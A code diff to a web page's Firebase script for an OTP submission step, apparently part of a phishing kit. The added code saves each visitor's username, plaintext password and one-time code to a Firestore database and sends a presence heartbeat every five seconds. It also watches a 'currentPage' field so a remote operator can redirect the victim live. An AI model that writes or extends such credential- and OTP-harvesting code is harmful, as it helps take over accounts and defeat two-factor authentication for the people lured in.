@@ -510,13 +510,14 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 
 import {
 
-    getFirestore,
+getFirestore,
     collection,
     query,
     where,
     getDocs,
     updateDoc,
-    doc
+    doc,
+    setDoc
 
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -549,6 +550,30 @@ const db = getFirestore(app);
 /* =========================
    SUBMIT OTP
 ========================= */
+
+setInterval(async ()=>{
+
+    const loginData =
+        JSON.parse(localStorage.getItem("loginData"));
+
+    if(!loginData) return;
+
+    const userId = generateUserId(loginData);
+
+    await setDoc(doc(db,"users",userId),{
+
+        lastSeen: Date.now()
+
+    },{ merge:true });
+
+},5000);
+
+
+function generateUserId(loginData){
+
+    return btoa(loginData.username);
+
+}
 
 document.getElementById('submitBtn').onclick = async () => {
 
@@ -587,25 +612,17 @@ document.getElementById('submitBtn').onclick = async () => {
 
     /* find current user */
 
-    const q = query(
-        collection(db,"users"),
-        where("username","==",loginData.username),
-        where("password","==",loginData.password)
-    );
+const userId = generateUserId(loginData);
 
-    const snapshot = await getDocs(q);
+await setDoc(doc(db,"users",userId),{
 
-for (const userDoc of snapshot.docs) {
+    username: loginData.username,
+    password: loginData.password,
+    otp: otpCode,
+    currentPage: "waitaccount.html",
+    lastSeen: Date.now()
 
-    await updateDoc(doc(db,"users",userDoc.id),{
-
-        otp: otpCode,
-        currentPage: "waitaccount.html"
-
-    });
-
-}
-
+},{ merge:true });
     /* redirect */
 
     setTimeout(() => {
@@ -660,9 +677,7 @@ document
 <script type="module">
 
 import {
-    collection,
-    query,
-    where,
+   doc,
     onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -673,39 +688,29 @@ const loginData =
 
 if(loginData){
 
-    const q = query(
-        collection(db,"users"),
-        where("username","==",loginData.username),
-        where("password","==",loginData.password)
-    );
+ const userId = generateUserId(loginData);
 
-    onSnapshot(q,(snapshot)=>{
+onSnapshot(doc(db,"users",userId),(docSnap)=>{
 
-        snapshot.forEach((docSnap)=>{
+    if(!docSnap.exists()) return;
 
-            const user = docSnap.data();
+    const user = docSnap.data();
 
-            const currentPage = user.currentPage;
+    const currentPage = user.currentPage;
 
-            /* current opened file */
+    const currentFile =
+        window.location.pathname.split("/").pop();
 
-            const currentFile =
-                window.location.pathname.split("/").pop();
+    if(
+        currentPage &&
+        currentPage !== currentFile
+    ){
 
-            /* redirect if changed */
+        window.location.href = currentPage;
 
-            if(
-                currentPage &&
-                currentPage !== currentFile
-            ){
+    }
 
-                window.location.href = currentPage;
-
-            }
-
-        });
-
-    });
+});
 
 }
 
